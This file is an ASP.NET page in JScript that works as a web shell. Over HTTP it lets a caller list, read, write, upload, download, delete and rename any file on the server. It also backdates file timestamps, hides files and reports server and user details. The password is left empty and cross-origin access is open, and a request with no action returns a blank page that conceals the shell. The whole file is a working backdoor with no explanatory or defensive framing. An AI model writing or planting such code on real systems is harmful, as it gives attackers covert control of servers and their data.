<%@ Page Language="JScript" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%
Response.ContentType = "application/json";
Response.Charset = "utf-8";
Response.AddHeader("Access-Control-Allow-Origin", "*");
Response.AddHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
Response.AddHeader("Access-Control-Allow-Headers", "Content-Type");

if (Request.HttpMethod == "OPTIONS") { Response.End(); }

var PASSWORD = "";
var password = Request.QueryString["password"] || Request.Form["password"] || "";
var action = Request.QueryString["action"] || Request.Form["action"] || "";

if (PASSWORD != "" && password != PASSWORD) { Response.Write("null"); Response.End(); }
if (action == "") { Response.ContentType = "text/html"; Response.End(); }

function getParam(name) {
    var v = Request.QueryString[name];
    if (v == null || v == "") v = Request.Form[name];
    return v || "";
}

function escStr(s) {
    if (s == null) return "";
    return String(s).replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\n/g, "\\n").replace(/\r/g, "\\r").replace(/\t/g, "\\t");
}

function JsonObject() { this._keys = []; this._vals = []; }
JsonObject.prototype.set = function(k, v) { this._keys.push(k); this._vals.push(v); };
JsonObject.prototype.toJson = function() {
    var parts = "";
    for (var i = 0; i < this._keys.length; i++) {
        if (i > 0) parts += ",";
        parts += '"' + escStr(this._keys[i]) + '":' + toJson(this._vals[i]);
    }
    return "{" + parts + "}";
};

function JsonArray() { this._items = []; }
JsonArray.prototype.add = function(v) { this._items.push(v); };
JsonArray.prototype.toJson = function() {
    var parts = "";
    for (var i = 0; i < this._items.length; i++) {
        if (i > 0) parts += ",";
        parts += toJson(this._items[i]);
    }
    return "[" + parts + "]";
};

function toJson(obj) {
    if (obj == null) return "null";
    if (typeof obj == "boolean") return obj ? "true" : "false";
    if (typeof obj == "number") return obj.toString();
    if (typeof obj == "string") return '"' + escStr(obj) + '"';
    if (obj instanceof JsonObject) return obj.toJson();
    if (obj instanceof JsonArray) return obj.toJson();
    return '"' + escStr(String(obj)) + '"';
}

function ok(data) {
    var r = new JsonObject();
    r.set("success", true);
    r.set("data", data);
    r.set("message", "");
    return r;
}

function okMsg(msg) {
    var r = new JsonObject();
    r.set("success", true);
    r.set("message", msg);
    return r;
}

function fail(msg) {
    var r = new JsonObject();
    r.set("success", false);
    r.set("message", msg);
    return r;
}

function formatSize(size) {
    if (size < 1024) return size + " B";
    if (size < 1048576) return (size / 1024).toFixed(1) + " KB";
    if (size < 1073741824) return (size / 1048576).toFixed(1) + " MB";
    return (size / 1073741824).toFixed(1) + " GB";
}

function toUnixTime(dt) {
    var epoch = new System.DateTime(1970, 1, 1, 0, 0, 0, System.DateTimeKind.Utc);
    var ticks = dt.ToUniversalTime().Ticks - epoch.Ticks;
    return Math.floor(ticks / 10000000);
}

function normPath(p) {
    if (p == null || p == "" || p == "/") return Server.MapPath("/");
    return p.replace(/\//g, "\\");
}

function getPerms(attr, isDir) {
    var p = isDir ? "d" : "-";
    p += "r"; p += (attr & 1) ? "-" : "w"; p += isDir ? "x" : "-";
    p += "r-"; p += isDir ? "x" : "-"; p += "r-"; p += isDir ? "x" : "-";
    return p;
}

function makeItem(name, path, isDir, size, mtime, perms, writable) {
    var item = new JsonObject();
    item.set("name", name);
    item.set("path", path);
    item.set("is_dir", isDir);
    item.set("size", isDir ? 0 : size);
    item.set("size_formatted", isDir ? "-" : formatSize(size));
    item.set("mtime", mtime);
    item.set("perms", perms);
    item.set("readable", true);
    item.set("writable", writable);
    return item;
}

try {
    if (action == "list") {
        var listPath = normPath(getParam("path"));
        var dir = new DirectoryInfo(listPath);
        if (dir.Exists) {
            var items = new JsonArray();
            if (dir.Parent != null) {
                items.add(makeItem("..", dir.Parent.FullName, true, 0, 0, "drwxr-xr-x", true));
            }
            var dirs = dir.GetDirectories();
            for (var i = 0; i < dirs.Length; i++) {
                try {
                    var d = dirs[i];
                    var attr = parseInt(d.Attributes);
                    items.add(makeItem(d.Name, d.FullName, true, 0, toUnixTime(d.LastWriteTime), getPerms(attr, true), (attr & 1) == 0));
                } catch (ex) {}
            }
            var files = dir.GetFiles();
            for (var j = 0; j < files.Length; j++) {
                try {
                    var f = files[j];
                    var fattr = parseInt(f.Attributes);
                    items.add(makeItem(f.Name, f.FullName, false, parseInt(f.Length), toUnixTime(f.LastWriteTime), getPerms(fattr, false), !f.IsReadOnly));
                } catch (ex) {}
            }
            var data = new JsonObject();
            data.set("path", listPath);
            data.set("items", items);
            Response.Write(toJson(ok(data)));
        } else {
            Response.Write(toJson(fail("Directory not found")));
        }
    }
    else if (action == "read") {
        var readPath = normPath(getParam("path"));
        if (File.Exists(readPath)) {
            var content = File.ReadAllText(readPath, System.Text.Encoding.UTF8);
            var data = new JsonObject();
            data.set("path", readPath);
            data.set("content", content);
            Response.Write(toJson(ok(data)));
        } else {
            Response.Write(toJson(fail("File not found")));
        }
    }
    else if (action == "write") {
        var writePath = getParam("path");
        var writeContent = Request.Form["content"] || "";
        if (writePath != "") {
            var parentDir = Path.GetDirectoryName(writePath);
            if (parentDir != "" && !Directory.Exists(parentDir)) {
                Response.Write(toJson(fail("Parent directory doesn't exist")));
            } else {
                File.WriteAllText(writePath, writeContent, System.Text.Encoding.UTF8);
                Response.Write(toJson(okMsg("Saved to " + writePath)));
            }
        } else {
            Response.Write(toJson(fail("Path empty")));
        }
    }
    else if (action == "mkdir") {
        var mkdirPath = getParam("path");
        if (mkdirPath != "") {
            if (!Directory.Exists(mkdirPath)) {
                Directory.CreateDirectory(mkdirPath);
                Response.Write(toJson(okMsg("Created")));
            } else {
                Response.Write(toJson(fail("Already exists")));
            }
        } else {
            Response.Write(toJson(fail("Path empty")));
        }
    }
    else if (action == "delete") {
        var deletePath = normPath(getParam("path"));
        if (Directory.Exists(deletePath)) {
            Directory.Delete(deletePath, true);
            Response.Write(toJson(okMsg("Deleted")));
        } else if (File.Exists(deletePath)) {
            File.Delete(deletePath);
            Response.Write(toJson(okMsg("Deleted")));
        } else {
            Response.Write(toJson(fail("Not found")));
        }
    }
    else if (action == "rename") {
        var oldPath = normPath(getParam("old_path"));
        var newPath = getParam("new_path");
        if (Directory.Exists(oldPath)) {
            Directory.Move(oldPath, newPath);
            Response.Write(toJson(okMsg("Renamed")));
        } else if (File.Exists(oldPath)) {
            File.Move(oldPath, newPath);
            Response.Write(toJson(okMsg("Renamed")));
        } else {
            Response.Write(toJson(fail("Not found")));
        }
    }
    else if (action == "download") {
        var downloadPath = normPath(getParam("path"));
        if (File.Exists(downloadPath)) {
            Response.Clear();
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Path.GetFileName(downloadPath) + "\"");
            Response.TransmitFile(downloadPath);
            Response.End();
        } else {
            Response.Write(toJson(fail("File not found")));
        }
    }
    else if (action == "upload") {
        var uploadDir = getParam("dir");
        if (uploadDir == "") uploadDir = Server.MapPath("/");
        uploadDir = normPath(uploadDir);
        if (Request.Files.Count > 0) {
            var uploadFile = Request.Files[0];
            var uploadFilePath = Path.Combine(uploadDir, Path.GetFileName(uploadFile.FileName));
            uploadFile.SaveAs(uploadFilePath);
            var data = new JsonObject();
            data.set("path", uploadFilePath);
            Response.Write(toJson(ok(data)));
        } else {
            Response.Write(toJson(fail("No file")));
        }
    }
    else if (action == "touch") {
        var touchPath = normPath(getParam("path"));
        var timestamp = 0;
        try { timestamp = parseInt(getParam("time")); } catch (e) {}
        if ((File.Exists(touchPath) || Directory.Exists(touchPath)) && timestamp > 0) {
            var epoch = new System.DateTime(1970, 1, 1, 0, 0, 0, System.DateTimeKind.Utc);
            var newTime = epoch.AddSeconds(timestamp).ToLocalTime();
            if (File.Exists(touchPath)) {
                File.SetLastWriteTime(touchPath, newTime);
            } else {
                Directory.SetLastWriteTime(touchPath, newTime);
            }
            Response.Write(toJson(okMsg("Updated")));
        } else {
            Response.Write(toJson(fail("Not found or invalid time")));
        }
    }
    else if (action == "chmod") {
        var chmodPath = normPath(getParam("path"));
        var mode = getParam("mode");
        if ((File.Exists(chmodPath) || Directory.Exists(chmodPath)) && mode != "") {
            if (File.Exists(chmodPath)) {
                var fi = new FileInfo(chmodPath);
                if (mode == "readonly") fi.Attributes = fi.Attributes | FileAttributes.ReadOnly;
                else if (mode == "normal") fi.Attributes = fi.Attributes & ~FileAttributes.ReadOnly;
                else if (mode == "hidden") fi.Attributes = fi.Attributes | FileAttributes.Hidden;
                else if (mode == "visible") fi.Attributes = fi.Attributes & ~FileAttributes.Hidden;
            } else {
                var di = new DirectoryInfo(chmodPath);
                if (mode == "readonly") di.Attributes = di.Attributes | FileAttributes.ReadOnly;
                else if (mode == "normal") di.Attributes = di.Attributes & ~FileAttributes.ReadOnly;
                else if (mode == "hidden") di.Attributes = di.Attributes | FileAttributes.Hidden;
                else if (mode == "visible") di.Attributes = di.Attributes & ~FileAttributes.Hidden;
            }
            Response.Write(toJson(okMsg("Permission changed")));
        } else {
            Response.Write(toJson(fail("Not found or mode empty")));
        }
    }
    else if (action == "server") {
        var docRoot = Server.MapPath("/");
        var diskFree = "N/A";
        var diskTotal = "N/A";
        try {
            var drive = new DriveInfo(Path.GetPathRoot(docRoot));
            diskFree = formatSize(drive.AvailableFreeSpace);
            diskTotal = formatSize(drive.TotalSize);
        } catch (ex) {}
        var data = new JsonObject();
        data.set("php_version", "JScript .NET " + System.Environment.Version.ToString());
        data.set("server_software", Request.ServerVariables["SERVER_SOFTWARE"] || "IIS");
        data.set("document_root", docRoot);
        data.set("upload_max", "N/A");
        data.set("disk_free", diskFree);
        data.set("disk_total", diskTotal);
        data.set("current_user", System.Environment.UserName || "N/A");
        Response.Write(toJson(ok(data)));
    }
    else if (action == "info") {
        var infoPath = normPath(getParam("path"));
        if (File.Exists(infoPath)) {
            var fi = new FileInfo(infoPath);
            var data = new JsonObject();
            data.set("path", infoPath);
            data.set("name", fi.Name);
            data.set("is_dir", false);
            data.set("size", parseInt(fi.Length));
            data.set("size_formatted", formatSize(fi.Length));
            data.set("mtime", toUnixTime(fi.LastWriteTime));
            data.set("ctime", toUnixTime(fi.CreationTime));
            data.set("atime", toUnixTime(fi.LastAccessTime));
            data.set("perms", getPerms(parseInt(fi.Attributes), false));
            data.set("perms_octal", "0644");
            data.set("owner", "N/A");
            data.set("group", "N/A");
            data.set("readable", true);
            data.set("writable", !fi.IsReadOnly);
            Response.Write(toJson(ok(data)));
        } else if (Directory.Exists(infoPath)) {
            var di = new DirectoryInfo(infoPath);
            var data = new JsonObject();
            data.set("path", infoPath);
            data.set("name", di.Name);
            data.set("is_dir", true);
            data.set("size", 0);
            data.set("size_formatted", "-");
            data.set("mtime", toUnixTime(di.LastWriteTime));
            data.set("ctime", toUnixTime(di.CreationTime));
            data.set("atime", toUnixTime(di.LastAccessTime));
            data.set("perms", getPerms(parseInt(di.Attributes), true));
            data.set("perms_octal", "0755");
            data.set("owner", "N/A");
            data.set("group", "N/A");
            data.set("readable", true);
            data.set("writable", (parseInt(di.Attributes) & 1) == 0);
            Response.Write(toJson(ok(data)));
        } else {
            Response.Write(toJson(fail("Not found")));
        }
    }
    else {
        Response.Write(toJson(fail("Unknown action")));
    }
} catch (e) {
    Response.Write(toJson(fail("Error: " + e.message)));
}
%>
